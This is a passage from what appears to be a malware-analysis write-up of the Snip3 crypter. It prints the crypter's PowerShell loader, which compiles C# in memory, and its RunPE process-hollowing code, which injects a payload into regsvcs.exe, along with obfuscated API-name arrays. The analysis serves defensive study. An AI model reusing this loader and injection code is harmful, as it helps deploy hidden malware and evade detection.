</span><span class="nv">$dictionary</span><span class="o">.</span><span class="nf">Add</span><span class="p">(</span><span class="s2">"CompilerVersion"</span><span class="p">,</span><span class="w"> </span><span class="s2">"v4.0"</span><span class="p">)</span><span class="w">
</span><span class="nv">$CsharpCompiler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Microsoft.CSharp.CSharpCodeProvider</span><span class="p">(</span><span class="nv">$dictionary</span><span class="p">)</span><span class="w">
</span><span class="nv">$CompilerParametres</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.CodeDom.Compiler.CompilerParameters</span><span class="w">
</span><span class="nv">$CompilerParametres</span><span class="o">.</span><span class="nf">ReferencedAssemblies</span><span class="o">.</span><span class="nf">Add</span><span class="p">(</span><span class="s2">"System.dll"</span><span class="p">)</span><span class="w">
</span><span class="nv">$CompilerParametres</span><span class="o">.</span><span class="nf">ReferencedAssemblies</span><span class="o">.</span><span class="nf">Add</span><span class="p">(</span><span class="s2">"System.Management.dll"</span><span class="p">)</span><span class="w">
</span><span class="nv">$CompilerParametres</span><span class="o">.</span><span class="nf">ReferencedAssemblies</span><span class="o">.</span><span class="nf">Add</span><span class="p">(</span><span class="s2">"System.Windows.Forms.dll"</span><span class="p">)</span><span class="w">
</span><span class="nv">$CompilerParametres</span><span class="o">.</span><span class="nf">ReferencedAssemblies</span><span class="o">.</span><span class="nf">Add</span><span class="p">(</span><span class="s2">"mscorlib.dll"</span><span class="p">)</span><span class="w">
</span><span class="nv">$CompilerParametres</span><span class="o">.</span><span class="nf">ReferencedAssemblies</span><span class="o">.</span><span class="nf">Add</span><span class="p">(</span><span class="s2">"Microsoft.VisualBasic.dll"</span><span class="p">)</span><span class="w">
</span><span class="nv">$CompilerParametres</span><span class="o">.</span><span class="nf">IncludeDebugInformation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$false</span><span class="w">
</span><span class="nv">$CompilerParametres</span><span class="o">.</span><span class="nf">GenerateExecutable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$false</span><span class="w">
</span><span class="nv">$CompilerParametres</span><span class="o">.</span><span class="nf">GenerateInMemory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$true</span><span class="w">
</span><span class="nv">$CompilerParametres</span><span class="o">.</span><span class="nf">CompilerOptions</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s2">"/platform:X86 /unsafe /target:library"</span><span class="w">
</span><span class="nv">$BB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Decompress</span><span class="p">(</span><span class="nv">$BB</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="n">System.CodeDom.Compiler.CompilerResults</span><span class="p">]</span><span class="w"> </span><span class="nv">$CompilerResults</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$CsharpCompiler</span><span class="o">.</span><span class="nf">CompileAssemblyFromSource</span><span class="p">(</span><span class="nv">$CompilerParametres</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="nx">Default.GetString</span><span class="p">(</span><span class="nv">$BB</span><span class="p">))</span><span class="w">
</span><span class="p">[</span><span class="n">Type</span><span class="p">]</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$CompilerResults</span><span class="o">.</span><span class="nf">CompiledAssembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="nv">$TP</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$Bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Web.HttpUtility</span><span class="p">]::</span><span class="n">UrlDecodeToBytes</span><span class="p">([</span><span class="n">Microsoft.VisualBasic.Strings</span><span class="p">]::</span><span class="n">StrReverse</span><span class="p">(</span><span class="s1">'00%00%00...'</span><span class="p">))</span><span class="w">
</span></pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">$CSharpCompiler</code> and <code class="language-plaintext highlighter-rouge">$CompilerParametres</code> variables hold objects and parameters around C# code compilation. When this code executes, you’ll see PowerShell spawning one or more <code class="language-plaintext highlighter-rouge">csc.exe</code> processes to convert the code into an executable assembly. The last variable <code class="language-plaintext highlighter-rouge">$Bytes</code> holds the adversary’s payload that Snip3 crypter protects during deployment. The payload is embedded within the script as bytes that are URL encoded and reversed afterward. We can easily obtain the original payload by executing the line of PowerShell storing the payload into <code class="language-plaintext highlighter-rouge">$Bytes</code> and then using <code class="language-plaintext highlighter-rouge">Set-Content</code> to write the content to disk. We can also obtain the RunPE code by doing the same with passing <code class="language-plaintext highlighter-rouge">$RUNPE</code> through <code class="language-plaintext highlighter-rouge">Decompress()</code> before writing the contents to disk using <code class="language-plaintext highlighter-rouge">Set-Content</code>. The final chunk of code is responsible for calling the RunPE injection code, telling it to spawn <code class="language-plaintext highlighter-rouge">regsvcs.exe</code>, and inject the final payload <code class="language-plaintext highlighter-rouge">$Bytes</code> into the memory space of <code class="language-plaintext highlighter-rouge">regsvcs.exe</code>.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="kr">try</span><span class="w">
</span><span class="p">{</span><span class="w">
</span><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="w"> </span><span class="nv">$MyPt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.IO.Path</span><span class="p">]::</span><span class="n">Combine</span><span class="p">([</span><span class="n">System.Runtime.InteropServices.RuntimeEnvironment</span><span class="p">]::</span><span class="n">GetRuntimeDirectory</span><span class="p">(),</span><span class="s2">"RegSvcs.exe"</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="n">Object</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$Params</span><span class="o">=</span><span class="p">@(</span><span class="nv">$MyPt</span><span class="err">.Replace(</span><span class="s2">"Framework64"</span><span class="p">,</span><span class="s2">"Framework"</span><span class="p">)</span><span class="w"> </span><span class="p">,</span><span class="nv">$Bytes</span><span class="p">)</span><span class="w">
</span><span class="kr">return</span><span class="w"> </span><span class="nv">$T</span><span class="o">.</span><span class="nf">GetMethod</span><span class="p">(</span><span class="nv">$MT</span><span class="p">)</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="w"> </span><span class="nv">$Params</span><span class="p">)</span><span class="w">
</span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="n">INSTALL</span><span class="w">
</span><span class="p">[</span><span class="n">System.Threading.Thread</span><span class="p">]::</span><span class="nx">Sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span><span class="w">
</span><span class="n">CodeDom</span><span class="w"> </span><span class="nv">$RUNPE</span><span class="w"> </span><span class="s2">"GIT.Repository"</span><span class="w"> </span><span class="s2">"Execute"</span><span class="w">
</span></pre></table></code></div></div><p>From here there are two paths we can branch into for our investigation: exploring Snip3 and exploring the final payload. The first path we’re going to take is exploring Snip3.</p><h2 id="examining-snip3s-code"><span class="mr-2">Examining Snip3’s code</span><a href="#examining-snip3s-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The entry point invoked in the Snip3 code is <code class="language-plaintext highlighter-rouge">[GIT.Repository]::Execute</code>. The code is slightly obfuscated in some places but the variable names are extremely self-explanatory.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="k">namespace</span> <span class="nn">GIT</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">sealed</span> <span class="k">class</span> <span class="nc">Repository</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Execute</span><span class="p">(</span><span class="kt">string</span> <span class="n">path</span><span class="p">,</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">payload</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="m">5</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span>
            <span class="p">{</span>
                <span class="kt">int</span> <span class="n">readWrite</span> <span class="p">=</span> <span class="m">0x0</span><span class="p">;</span>
                <span class="n">NativeMethods</span><span class="p">.</span><span class="n">StartupInformation</span> <span class="n">si</span> <span class="p">=</span> <span class="k">new</span> <span class="n">NativeMethods</span><span class="p">.</span><span class="nf">StartupInformation</span><span class="p">();</span>
                <span class="n">NativeMethods</span><span class="p">.</span><span class="n">ProcessInformation</span> <span class="n">pi</span> <span class="p">=</span> <span class="k">new</span> <span class="n">NativeMethods</span><span class="p">.</span><span class="nf">ProcessInformation</span><span class="p">();</span>
                <span class="n">si</span><span class="p">.</span><span class="n">Size</span> <span class="p">=</span> <span class="p">(</span><span class="n">UInt32</span><span class="p">)(</span><span class="n">Marshal</span><span class="p">.</span><span class="nf">SizeOf</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">NativeMethods</span><span class="p">.</span><span class="n">StartupInformation</span><span class="p">)));</span> <span class="c1">//Attention !</span>

                <span class="k">try</span>
                <span class="p">{</span>
                    <span class="kt">bool</span> <span class="n">createProc</span> <span class="p">=</span> <span class="n">NativeMethods</span><span class="p">.</span><span class="nf">CreateProcessA</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="m">0x00000004</span> <span class="p">|</span> <span class="m">0x08000000</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">ref</span> <span class="n">si</span><span class="p">,</span> <span class="k">ref</span> <span class="n">pi</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(!</span><span class="n">createProc</span><span class="p">)</span>
                    <span class="p">{</span>
                        <span class="k">throw</span> <span class="k">new</span> <span class="nf">Exception</span><span class="p">();</span>
                    <span class="p">}</span>

                    <span class="p">...</span>

                    <span class="k">if</span> <span class="p">(</span><span class="n">imageBase</span> <span class="p">==</span> <span class="n">baseAddress</span><span class="p">)</span>
                    <span class="p">{</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">NativeMethods</span><span class="p">.</span><span class="nf">ZwUnmapViewOfSection</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">ProcessHandle</span><span class="p">,</span> <span class="n">baseAddress</span><span class="p">)</span> <span class="p">!=</span> <span class="m">0</span><span class="p">)</span>
                        <span class="p">{</span>
                            <span class="k">throw</span> <span class="k">new</span> <span class="nf">Exception</span><span class="p">();</span>
                        <span class="p">}</span>
                    <span class="p">}</span>

                    <span class="p">...</span>

                    <span class="kt">bool</span> <span class="n">writeProcessMemory</span> <span class="p">=</span> <span class="n">NativeMethods</span><span class="p">.</span><span class="nf">WriteProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">ProcessHandle</span><span class="p">,</span> <span class="n">newImageBase</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">sizeOfHeaders</span><span class="p">,</span> <span class="k">ref</span> <span class="n">readWrite</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(!</span><span class="n">writeProcessMemory</span><span class="p">)</span>
                    <span class="p">{</span>
                        <span class="k">throw</span> <span class="k">new</span> <span class="nf">Exception</span><span class="p">();</span>
                    <span class="p">}</span>
</pre></table></code></div></div><p>Some of the structure and variable names reference Windows API methods used during process hollowing injection. These include <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code>, <code class="language-plaintext highlighter-rouge">ZwUnmapViewOfSection</code>, and <code class="language-plaintext highlighter-rouge">CreateProcessA</code>. While the structure and variable names are self-explanatory, the process of those names getting attached to the actual API calls is slightly more obfuscated. This can be seen in <code class="language-plaintext highlighter-rouge">Helper</code> struct. Each of the API calls and DLL names required are stored as an integer array that must be decoded in a later function.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>    <span class="k">public</span> <span class="k">struct</span> <span class="nc">Helper</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="k">static</span> <span class="kt">int</span><span class="p">[]</span> <span class="n">Kernel32</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">int</span><span class="p">[]</span> <span class="p">{</span> <span class="m">3105607</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3106650</span><span class="p">,</span> <span class="m">3106054</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3105756</span><span class="p">,</span> <span class="m">3097263</span><span class="p">,</span> <span class="m">3097114</span> <span class="p">};</span>
        <span class="k">public</span> <span class="k">static</span> <span class="kt">int</span><span class="p">[]</span> <span class="n">NtDLL</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">int</span><span class="p">[]</span> <span class="p">{</span> <span class="m">3106054</span><span class="p">,</span> <span class="m">3106948</span><span class="p">,</span> <span class="m">3104564</span><span class="p">,</span> <span class="m">3105756</span><span class="p">,</span> <span class="m">3105756</span> <span class="p">};</span>

        <span class="k">public</span> <span class="k">static</span> <span class="kt">int</span><span class="p">[]</span> <span class="n">ResumeThread</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">int</span><span class="p">[]</span> <span class="p">{</span> <span class="m">3101882</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3106799</span><span class="p">,</span> <span class="m">3107097</span><span class="p">,</span> <span class="m">3105905</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3102180</span><span class="p">,</span> <span class="m">3105160</span><span class="p">,</span> <span class="m">3106650</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3104117</span><span class="p">,</span> <span class="m">3104564</span> <span class="p">};</span>
        <span class="k">public</span> <span class="k">static</span> <span class="kt">int</span><span class="p">[]</span> <span class="n">Wow64SetThreadContext</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">int</span><span class="p">[]</span> <span class="p">{</span> <span class="m">3102627</span><span class="p">,</span> <span class="m">3106203</span><span class="p">,</span> <span class="m">3107395</span><span class="p">,</span> <span class="m">3097710</span><span class="p">,</span> <span class="m">3097412</span><span class="p">,</span> <span class="m">3102031</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3106948</span><span class="p">,</span> <span class="m">3102180</span><span class="p">,</span> <span class="m">3105160</span><span class="p">,</span> <span class="m">3106650</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3104117</span><span class="p">,</span> <span class="m">3104564</span><span class="p">,</span> <span class="m">3099647</span><span class="p">,</span> <span class="m">3106203</span><span class="p">,</span> <span class="m">3106054</span><span class="p">,</span> <span class="m">3106948</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3107544</span><span class="p">,</span> <span class="m">3106948</span> <span class="p">};</span>
        <span class="k">public</span> <span class="k">static</span> <span class="kt">int</span><span class="p">[]</span> <span class="n">SetThreadContext</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">int</span><span class="p">[]</span> <span class="p">{</span> <span class="m">3102031</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3106948</span><span class="p">,</span> <span class="m">3102180</span><span class="p">,</span> <span class="m">3105160</span><span class="p">,</span> <span class="m">3106650</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3104117</span><span class="p">,</span> <span class="m">3104564</span><span class="p">,</span> <span class="m">3099647</span><span class="p">,</span> <span class="m">3106203</span><span class="p">,</span> <span class="m">3106054</span><span class="p">,</span> <span class="m">3106948</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3107544</span><span class="p">,</span> <span class="m">3106948</span> <span class="p">};</span>
        <span class="k">public</span> <span class="k">static</span> <span class="kt">int</span><span class="p">[]</span> <span class="n">Wow64GetThreadContext</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">int</span><span class="p">[]</span> <span class="p">{</span> <span class="m">3102627</span><span class="p">,</span> <span class="m">3106203</span><span class="p">,</span> <span class="m">3107395</span><span class="p">,</span> <span class="m">3097710</span><span class="p">,</span> <span class="m">3097412</span><span class="p">,</span> <span class="m">3100243</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3106948</span><span class="p">,</span> <span class="m">3102180</span><span class="p">,</span> <span class="m">3105160</span><span class="p">,</span> <span class="m">3106650</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3104117</span><span class="p">,</span> <span class="m">3104564</span><span class="p">,</span> <span class="m">3099647</span><span class="p">,</span> <span class="m">3106203</span><span class="p">,</span> <span class="m">3106054</span><span class="p">,</span> <span class="m">3106948</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3107544</span><span class="p">,</span> <span class="m">3106948</span> <span class="p">};</span>
        <span class="k">public</span> <span class="k">static</span> <span class="kt">int</span><span class="p">[]</span> <span class="n">GetThreadContext</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">int</span><span class="p">[]</span> <span class="p">{</span> <span class="m">3100243</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3106948</span><span class="p">,</span> <span class="m">3102180</span><span class="p">,</span> <span class="m">3105160</span><span class="p">,</span> <span class="m">3106650</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3104117</span><span class="p">,</span> <span class="m">3104564</span><span class="p">,</span> <span class="m">3099647</span><span class="p">,</span> <span class="m">3106203</span><span class="p">,</span> <span class="m">3106054</span><span class="p">,</span> <span class="m">3106948</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3107544</span><span class="p">,</span> <span class="m">3106948</span> <span class="p">};</span>
        <span class="k">public</span> <span class="k">static</span> <span class="kt">int</span><span class="p">[]</span> <span class="n">VirtualAllocEx</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">int</span><span class="p">[]</span> <span class="p">{</span> <span class="m">3102478</span><span class="p">,</span> <span class="m">3105309</span><span class="p">,</span> <span class="m">3106650</span><span class="p">,</span> <span class="m">3106948</span><span class="p">,</span> <span class="m">3107097</span><span class="p">,</span> <span class="m">3104117</span><span class="p">,</span> <span class="m">3105756</span><span class="p">,</span> <span class="m">3099349</span><span class="p">,</span> <span class="m">3105756</span><span class="p">,</span> <span class="m">3105756</span><span class="p">,</span> <span class="m">3106203</span><span class="p">,</span> <span class="m">3104415</span><span class="p">,</span> <span class="m">3099945</span><span class="p">,</span> <span class="m">3107544</span> <span class="p">};</span>
        <span class="k">public</span> <span class="k">static</span> <span class="kt">int</span><span class="p">[]</span> <span class="n">WriteProcessMemory</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">int</span><span class="p">[]</span> <span class="p">{</span> <span class="m">3102627</span><span class="p">,</span> <span class="m">3106650</span><span class="p">,</span> <span class="m">3105309</span><span class="p">,</span> <span class="m">3106948</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3101584</span><span class="p">,</span> <span class="m">3106650</span><span class="p">,</span> <span class="m">3106203</span><span class="p">,</span> <span class="m">3104415</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3106799</span><span class="p">,</span> <span class="m">3106799</span><span class="p">,</span> <span class="m">3101137</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3105905</span><span class="p">,</span> <span class="m">3106203</span><span class="p">,</span> <span class="m">3106650</span><span class="p">,</span> <span class="m">3107693</span> <span class="p">};</span>
        <span class="k">public</span> <span class="k">static</span> <span class="kt">int</span><span class="p">[]</span> <span class="n">ReadProcessMemory</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">int</span><span class="p">[]</span> <span class="p">{</span> <span class="m">3101882</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3104117</span><span class="p">,</span> <span class="m">3104564</span><span class="p">,</span> <span class="m">3101584</span><span class="p">,</span> <span class="m">3106650</span><span class="p">,</span> <span class="m">3106203</span><span class="p">,</span> <span class="m">3104415</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3106799</span><span class="p">,</span> <span class="m">3106799</span><span class="p">,</span> <span class="m">3101137</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3105905</span><span class="p">,</span> <span class="m">3106203</span><span class="p">,</span> <span class="m">3106650</span><span class="p">,</span> <span class="m">3107693</span> <span class="p">};</span>
        <span class="k">public</span> <span class="k">static</span> <span class="kt">int</span><span class="p">[]</span> <span class="n">ZwUnmapViewOfSection</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">int</span><span class="p">[]</span> <span class="p">{</span> <span class="m">3103074</span><span class="p">,</span> <span class="m">3107395</span><span class="p">,</span> <span class="m">3102329</span><span class="p">,</span> <span class="m">3106054</span><span class="p">,</span> <span class="m">3105905</span><span class="p">,</span> <span class="m">3104117</span><span class="p">,</span> <span class="m">3106352</span><span class="p">,</span> <span class="m">3102478</span><span class="p">,</span> <span class="m">3105309</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3107395</span><span class="p">,</span> <span class="m">3101435</span><span class="p">,</span> <span class="m">3104862</span><span class="p">,</span> <span class="m">3102031</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3104415</span><span class="p">,</span> <span class="m">3106948</span><span class="p">,</span> <span class="m">3105309</span><span class="p">,</span> <span class="m">3106203</span><span class="p">,</span> <span class="m">3106054</span> <span class="p">};</span>
        <span class="k">public</span> <span class="k">static</span> <span class="kt">int</span><span class="p">[]</span> <span class="n">CreateProcessA</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">int</span><span class="p">[]</span> <span class="p">{</span> <span class="m">3099647</span><span class="p">,</span> <span class="m">3106650</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3104117</span><span class="p">,</span> <span class="m">3106948</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3101584</span><span class="p">,</span> <span class="m">3106650</span><span class="p">,</span> <span class="m">3106203</span><span class="p">,</span> <span class="m">3104415</span><span class="p">,</span> <span class="m">3104713</span><span class="p">,</span> <span class="m">3106799</span><span class="p">,</span> <span class="m">3106799</span><span class="p">,</span> <span class="m">3099349</span> <span class="p">};</span>
    <span class="p">}</span>
</pre></table></code></div></div><p>The API mapping to structure name process is handled by code from this <code class="language-plaintext highlighter-rouge">NativeMethods</code> class in the crypter. During the mapping process the class calls <code class="language-plaintext highlighter-rouge">Decode.BytesToString()</code> in another class to finish translating each integer array to a string needed for the API.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>    <span class="k">public</span> <span class="k">abstract</span> <span class="k">class</span> <span class="nc">NativeMethods</span>
    <span class="p">{</span>
        <span class="k">private</span> <span class="k">const</span> <span class="kt">string</span> <span class="n">Key</span> <span class="p">=</span> <span class="s">"QoMn4OhGfV+oHNb8AzV=="</span><span class="p">;</span>

        <span class="k">public</span> <span class="k">delegate</span> <span class="kt">int</span> <span class="nf">DelegateResumeThread</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">handle</span><span class="p">);</span>
        <span class="k">public</span> <span class="k">delegate</span> <span class="kt">bool</span> <span class="nf">DelegateWow64SetThreadContext</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">thread</span><span class="p">,</span> <span class="kt">int</span><span class="p">[]</span> <span class="n">context</span><span class="p">);</span>
        <span class="k">public</span> <span class="k">delegate</span> <span class="kt">bool</span> <span class="nf">DelegateSetThreadContext</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">thread</span><span class="p">,</span> <span class="kt">int</span><span class="p">[]</span> <span class="n">context</span><span class="p">);</span>
        <span class="k">public</span> <span class="k">delegate</span> <span class="kt">bool</span> <span class="nf">DelegateWow64GetThreadContext</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">thread</span><span class="p">,</span> <span class="kt">int</span><span class="p">[]</span> <span class="n">context</span><span class="p">);</span>
        <span class="k">public</span> <span class="k">delegate</span> <span class="kt">bool</span> <span class="nf">DelegateGetThreadContext</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">thread</span><span class="p">,</span> <span class="kt">int</span><span class="p">[]</span> <span class="n">context</span><span class="p">);</span>
        <span class="k">public</span> <span class="k">delegate</span> <span class="kt">int</span> <span class="nf">DelegateVirtualAllocEx</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">handle</span><span class="p">,</span> <span class="kt">int</span> <span class="n">address</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">protect</span><span class="p">);</span>
        <span class="k">public</span> <span class="k">delegate</span> <span class="kt">bool</span> <span class="nf">DelegateWriteProcessMemory</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">process</span><span class="p">,</span> <span class="kt">int</span> <span class="n">baseAddress</span><span class="p">,</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">bufferSize</span><span class="p">,</span> <span class="k">ref</span> <span class="kt">int</span> <span class="n">bytesWritten</span><span class="p">);</span>
        <span class="k">public</span> <span class="k">delegate</span> <span class="kt">bool</span> <span class="nf">DelegateReadProcessMemory</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">process</span><span class="p">,</span> <span class="kt">int</span> <span class="n">baseAddress</span><span class="p">,</span> <span class="k">ref</span> <span class="kt">int</span> <span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">bufferSize</span><span class="p">,</span> <span class="k">ref</span> <span class="kt">int</span> <span class="n">bytesRead</span><span class="p">);</span>
        <span class="k">public</span> <span class="k">delegate</span> <span class="kt">int</span> <span class="nf">DelegateZwUnmapViewOfSection</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">process</span><span class="p">,</span> <span class="kt">int</span> <span class="n">baseAddress</span><span class="p">);</span>
        <span class="k">public</span> <span class="k">delegate</span> <span class="kt">bool</span> <span class="nf">DelegateCreateProcessA</span><span class="p">(</span><span class="kt">string</span> <span class="n">applicationName</span><span class="p">,</span> <span class="kt">string</span> <span class="n">commandLine</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">processAttributes</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">threadAttributes</span><span class="p">,</span>
            <span class="kt">bool</span> <span class="n">inheritHandles</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">creationFlags</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">environment</span><span class="p">,</span> <span class="kt">string</span> <span class="n">currentDirectory</span><span class="p">,</span> <span class="k">ref</span> <span class="n">StartupInformation</span> <span class="n">startupInfo</span><span class="p">,</span> <span class="k">ref</span> <span class="n">ProcessInformation</span> <span class="n">processInformation</span><span class="p">);</span>

        <span class="k">public</span> <span class="k">static</span> <span class="k">readonly</span> <span class="n">DelegateResumeThread</span> <span class="n">ResumeThread</span> <span class="p">=</span> <span class="n">LoadApi</span><span class="p">&lt;</span><span class="n">DelegateResumeThread</span><span class="p">&gt;(</span><span class="n">Decode</span><span class="p">.</span><span class="nf">BytesToString</span><span class="p">(</span><span class="n">Decode</span><span class="p">.</span><span class="nf">IntegerToBytes</span><span class="p">(</span><span class="n">Helper</span><span class="p">.</span><span class="n">Kernel32</span><span class="p">,</span> <span class="n">Key</span><span class="p">)),</span> <span class="n">Decode</span><span class="p">.</span><span class="nf">BytesToString</span><span class="p">(</span><span class="n">Decode</span><span class="p">.</span><span class="nf">IntegerToBytes</span><span class="p">(</span><span class="n">Helper</span><span class="p">.</span><span class="n">ResumeThread</span><span class="p">,</span> <span class="n">Key</span><span class="p">)));</span>
